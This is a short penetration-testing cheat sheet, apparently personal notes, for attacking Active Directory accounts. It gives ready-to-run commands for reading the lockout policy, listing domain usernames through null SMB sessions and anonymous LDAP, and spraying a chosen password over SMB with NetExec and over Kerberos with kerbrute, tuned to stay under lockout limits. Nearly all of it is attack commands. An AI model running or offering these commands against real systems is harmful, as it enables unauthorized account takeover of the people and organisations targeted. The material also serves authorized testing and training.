# Initial Enumeration
Run the following command on a target if possible:
```batch
net accounts
```
This will give two important details:
* Lockout threshold (how many attempts before your locked out)
* Lockout observation window (how long your locked out for)

It is worth noting these values and adjusting password spraying attacks accordingly (i.e. do less password attempts than the lockout).
## Use nxc to grab Password Policy
```bash
nxc smb $(IP_ADDRESS) -u $(USERNAME) -p $(PASSWORD) --pass-pol
```
## Use SMB Null Session
```bash
rpclient -U "" -N $(IP_ADDRESS)
```
```bash
querydompwinfo
```
### Obtain valid list of usernames via rpcclient
```bash
enumdomusers
```
### Obtain list of valid usernames via enum4linux
```bash
enum4linux -U $(IP_ADDRESS) | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```
### Obtain list of valid usernames via NetExec
```bash
nxc smb $(IP_ADDRESS) --users
```
## Use Anonymous LDAP Access
### Obtain list of valid usernames via ldapsearch
In this command, it's attacking IP 1.2.3.4 on domain.local
```bash
ldapsearch -h 1.2.3.4 -x -b "DC=domain,DC=local" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d " " 
```
### Obtain list of valid usernames via windapsearch
In this command, it's attacking IP 1.2.3.4 on domain.local
```bash
./windapsearch.py --dc-ip 1.2.3.4 -u "" -U
```
# SMB Password Spraying
Sprays user accounts with "Nexus123!" password
```bash
nxc smb $(ANY_DOMAIN_JOINED_MACHINE_IP) -u users.txt -p 'Nexus123!' -d $(DOMAIN) --continue-on-success
```
Spray multiple targets at once:
```bash
nxc smb 192.168.182.70-76 -u users.txt -p 'Nexus123!' -d $(DOMAIN) --continue-on-success
```
# TGT Password Spraying
https://github.com/ropnop/kerbrute

Kerbrute can be run on windows or linux. This example runs on windows to spray usernames with the password "Nexus123!".
```powershell
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```
